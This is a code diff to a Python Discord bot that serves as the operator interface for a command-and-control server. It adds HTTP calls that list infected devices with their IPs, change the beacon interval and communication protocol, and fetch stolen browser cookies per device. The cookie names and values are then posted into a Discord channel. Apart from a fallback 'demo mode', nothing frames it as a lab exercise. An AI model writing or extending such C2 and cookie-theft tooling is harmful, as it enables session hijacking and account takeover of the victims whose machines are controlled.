@@ -2,16 +2,23 @@
 Discord bot entry point.
 Uses slash commands (app_commands) with autocomplete for a better UX,
 and logs every command invocation to the terminal for tracking.
+
+Commands are forwarded to the C2 server via HTTP. If the server is
+offline, the bot falls back to standalone/demo mode.
 """
 
 import logging
+from typing import Any
 
 import discord
 from discord import app_commands
 from discord.ext import commands
 
+import httpx
+
 from config import (
     ADMIN_DISCORD_ID,
+    C2_SERVER_URL,
     COMMAND_PREFIX,
     DISCORD_BOT_TOKEN,
     VALID_BEACON_INTERVALS,
@@ -39,6 +46,86 @@ intents.message_content = True
 
 bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents)
 device_manager = DeviceManager()
+
+# ---------------------------------------------------------------------------
+# HTTP bridge to C2 server
+# ---------------------------------------------------------------------------
+
+
+async def call_server(
+    endpoint: str,
+    method: str = "GET",
+    json_body: dict[str, Any] | None = None,
+) -> dict[str, Any] | None:
+    """
+    Call the C2 server via HTTP.
+    Returns the response dict, or None if the server is unreachable.
+    """
+    url = f"{C2_SERVER_URL}{endpoint}"
+    try:
+        async with httpx.AsyncClient(timeout=10.0) as client:
+            if method == "POST":
+                resp = await client.post(url, json=json_body)
+            else:
+                resp = await client.get(url)
+
+            if resp.status_code >= 400:
+                logger.warning(
+                    "Server returned %d for %s %s",
+                    resp.status_code,
+                    method,
+                    endpoint,
+                )
+                return None
+
+            logger.info("Server response from %s %s: OK", method, endpoint)
+            return resp.json()
+    except httpx.ConnectError:
+        logger.warning(
+            "Server unreachable at %s — running in standalone mode",
+            C2_SERVER_URL,
+        )
+        return None
+    except Exception as exc:
+        logger.error("Error calling server: %s", exc)
+        return None
+
+
+def format_server_devices(data: dict[str, Any]) -> str:
+    """Format a /admin/devices response into a Discord-friendly string."""
+    devices = data.get("data", {}).get("devices", [])
+    if not devices:
+        return f"✅ {data.get('message', 'No devices found')}"
+
+    lines = [f"✅ **Server Response — {data.get('message', '')}**"]
+    for d in devices:
+        status_emoji = "🟢" if d["status"] == "online" else "🔴"
+        lines.append(
+            f"{status_emoji} **{d['name']}** — "
+            f"IP: `{d['ip']}` — Status: {d['status']}"
+        )
+    return "\n".join(lines)
+
+
+def format_server_cookies(data: dict[str, Any]) -> str:
+    """Format a /admin/cookies response into a Discord-friendly string."""
+    cookies = data.get("data", {}).get("cookies_by_device", {})
+    if not cookies:
+        return f"✅ {data.get('message', 'No cookies found')}"
+
+    lines = [f"✅ **Server Response — {data.get('message', '')}**"]
+    for device_name, device_cookies in cookies.items():
+        for cname, cvalue in device_cookies.items():
+            lines.append(f"🍪 `{device_name}` → `{cname}` = `{cvalue}`")
+    return "\n".join(lines)
+
+
+def format_server_simple(data: dict[str, Any]) -> str:
+    """Format a simple success/error response."""
+    status = data.get("status", "unknown")
+    message = data.get("message", "")
+    emoji = "✅" if status == "success" else "❌"
+    return f"{emoji} {message}"
 
 
 # ---------------------------------------------------------------------------
@@ -92,7 +179,7 @@ def log_access_denied(interaction: discord.Interaction, command_name: str) -> No
 
 @bot.event
 async def on_ready() -> None:
-    """Sync slash commands and log a message when the bot connects."""
+    """Sync slash commands and log when the bot connects."""
     try:
         synced = await bot.tree.sync()
         logger.info(
@@ -103,6 +190,13 @@ async def on_ready() -> None:
         )
     except Exception as e:
         logger.error("Failed to sync commands: %s", e)
+
+    # Check server connectivity.
+    health = await call_server("/health")
+    if health:
+        logger.info("C2 server is reachable — server bridge active")
+    else:
+        logger.warning("C2 server is not reachable — standalone mode")
 
     logger.info("Waiting for commands...")
 
@@ -154,16 +248,23 @@ async def show_devices(interaction: discord.Interaction) -> None:
         return
 
     log_command(interaction, "show-devices")
-    response = device_manager.show_devices()
+
+    # Try server first, fall back to local.
+    server_response = await call_server("/admin/devices")
+    if server_response:
+        response = format_server_devices(server_response)
+    else:
+        response = device_manager.show_devices()
+
     await interaction.response.send_message(response)
 
 
 @bot.tree.command(
     name="set-beacon-interval",
-    description="Set the beacon interval. Valid values: 2, 8, 16, 32.",
+    description="Set the beacon interval. Valid values: 2, 4, 8, 16, 32.",
 )
 @app_commands.autocomplete(interval=beacon_interval_autocomplete)
-@app_commands.describe(interval="Beacon interval in seconds (2, 8, 16, or 32)")
+@app_commands.describe(interval="Beacon interval in seconds (2, 4, 8, 16, or 32)")
 async def set_beacon_interval(
     interaction: discord.Interaction,
     interval: int,
@@ -178,7 +279,15 @@ async def set_beacon_interval(
         return
 
     log_command(interaction, "set-beacon-interval", f"interval={interval}")
-    response = device_manager.set_beacon_interval(interval)
+
+    server_response = await call_server(
+        "/admin/beacon-interval", method="POST", json_body={"interval": interval}
+    )
+    if server_response:
+        response = format_server_simple(server_response)
+    else:
+        response = device_manager.set_beacon_interval(interval)
+
     await interaction.response.send_message(response)
 
 
@@ -197,7 +306,13 @@ async def request_cookies(interaction: discord.Interaction) -> None:
         return
 
     log_command(interaction, "request-cookies")
-    response = device_manager.request_cookies()
+
+    server_response = await call_server("/admin/cookies")
+    if server_response:
+        response = format_server_cookies(server_response)
+    else:
+        response = device_manager.request_cookies()
+
     await interaction.response.send_message(response)
 
 
@@ -221,7 +336,17 @@ async def set_communication_protocol(
         return
 
     log_command(interaction, "set-communication-protocol", f"protocol={protocol}")
-    response = device_manager.set_communication_protocol(protocol)
+
+    server_response = await call_server(
+        "/admin/communication-protocol",
+        method="POST",
+        json_body={"protocol": protocol},
+    )
+    if server_response:
+        response = format_server_simple(server_response)
+    else:
+        response = device_manager.set_communication_protocol(protocol)
+
     await interaction.response.send_message(response)
 
 
